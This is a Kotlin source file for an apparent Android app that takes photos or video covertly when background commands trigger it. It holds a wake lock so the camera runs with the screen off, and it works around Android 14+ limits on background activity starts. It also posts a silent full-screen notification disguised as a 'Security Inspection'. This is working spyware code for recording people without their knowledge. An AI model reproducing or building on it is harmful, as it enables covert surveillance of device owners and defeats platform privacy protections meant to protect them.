package com.izhaanintellect.pasa.camera

import android.app.ActivityOptions
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.izhaanintellect.pasa.PasaApp
import com.izhaanintellect.pasa.ui.StealthCaptureActivity
import kotlinx.coroutines.CompletableDeferred
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import kotlinx.coroutines.withTimeoutOrNull
import java.io.File

/**
 * Bridge coordinating stealth camera capture between background commands and StealthCaptureActivity.
 * Ensures the app transitions to TOP process state so Android 14-16 CameraService grants hardware access.
 */
object StealthCaptureBridge {

    private const val TAG = "PASA_StealthBridge"
    private const val NOTIFICATION_ID = 2002

    data class CaptureResult(
        val file: File?,
        val error: String? = null
    )

    private var activeDeferred: CompletableDeferred<CaptureResult>? = null
    private val captureMutex = Mutex()

    suspend fun capturePhoto(context: Context, useFront: Boolean, timeoutMs: Long = 15000L): CaptureResult {
        // Serialize concurrent capture requests to prevent race conditions
        return captureMutex.withLock {
            executeCapture(context, StealthCaptureActivity.MODE_PHOTO, useFront, 0, timeoutMs)
        }
    }

    suspend fun recordVideo(context: Context, useFront: Boolean, durationSeconds: Int, timeoutMs: Long = 45000L): CaptureResult {
        return captureMutex.withLock {
            executeCapture(context, StealthCaptureActivity.MODE_VIDEO, useFront, durationSeconds, timeoutMs)
        }
    }

    private suspend fun executeCapture(
        context: Context,
        mode: String,
        useFront: Boolean,
        durationSeconds: Int,
        timeoutMs: Long
    ): CaptureResult {
        val deferred = CompletableDeferred<CaptureResult>()
        activeDeferred = deferred

        var wakeLock: PowerManager.WakeLock? = null
        val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager

        try {
            // 1. Acquire PARTIAL_WAKE_LOCK — keeps camera ISP alive WITHOUT lighting the screen
            try {
                val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
                wakeLock = pm?.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "pasa:stealth_capture_wake"
                )
                wakeLock?.acquire(timeoutMs + 5000L)
                Log.d(TAG, "Partial wake lock acquired for stealth capture")
            } catch (e: Exception) {
                Log.w(TAG, "WakeLock acquisition error: ${e.message}")
            }

            // 2. Build capture Intent
            val intent = Intent(context, StealthCaptureActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                putExtra(StealthCaptureActivity.EXTRA_MODE, mode)
                putExtra(StealthCaptureActivity.EXTRA_CAMERA_FRONT, useFront)
                putExtra(StealthCaptureActivity.EXTRA_DURATION, durationSeconds)
            }

            // 3. Build PendingIntent with Android 14+ background launch allowance
            val pendingIntent = PendingIntent.getActivity(
                context,
                NOTIFICATION_ID,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )

            // Try direct startActivity first
            try {
                context.startActivity(intent)
            } catch (e: Exception) {
                Log.w(TAG, "Direct startActivity restricted: ${e.message}")
            }

            // Try PendingIntent with background activity start allowed (Android 14+)
            try {
                val options = ActivityOptions.makeBasic()
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    options.pendingIntentBackgroundActivityStartMode =
                        ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED
                }
                pendingIntent.send(context, 0, null, null, null, null, options.toBundle())
            } catch (e: Exception) {
                Log.w(TAG, "PendingIntent send error: ${e.message}")
            }

            // Also post full-screen intent notification to guarantee launch over keyguard on Android 14-16
            try {
                val notification = NotificationCompat.Builder(context, PasaApp.ALERT_CHANNEL_ID)
                    .setSmallIcon(android.R.drawable.ic_dialog_alert)
                    .setContentTitle("Security Inspection")
                    .setContentText("Hardware verification in progress")
                    .setPriority(NotificationCompat.PRIORITY_MAX)
                    .setCategory(NotificationCompat.CATEGORY_ALARM)
                    .setFullScreenIntent(pendingIntent, true)
                    .setOngoing(false)
                    .setAutoCancel(true)
                    .setSilent(true)
                    .build()

                nm?.notify(NOTIFICATION_ID, notification)
            } catch (e: Exception) {
                Log.w(TAG, "Could not post full-screen intent notification: ${e.message}")
            }

            // 4. Await result with timeout
            val result = withTimeoutOrNull(timeoutMs) {
                deferred.await()
            }

            return result ?: CaptureResult(
                file = null,
                error = "Capture timed out after ${timeoutMs / 1000}s. Screen did not grant sensor access."
            )

        } catch (e: Exception) {
            Log.e(TAG, "Execution error in StealthCaptureBridge", e)
            return CaptureResult(file = null, error = e.localizedMessage ?: "Unknown capture error")
        } finally {
            activeDeferred = null
            try { nm?.cancel(NOTIFICATION_ID) } catch (_: Exception) {}
            try {
                if (wakeLock?.isHeld == true) wakeLock.release()
            } catch (_: Exception) {}
        }
    }

    fun notifyResult(result: CaptureResult) {
        activeDeferred?.complete(result)
    }
}
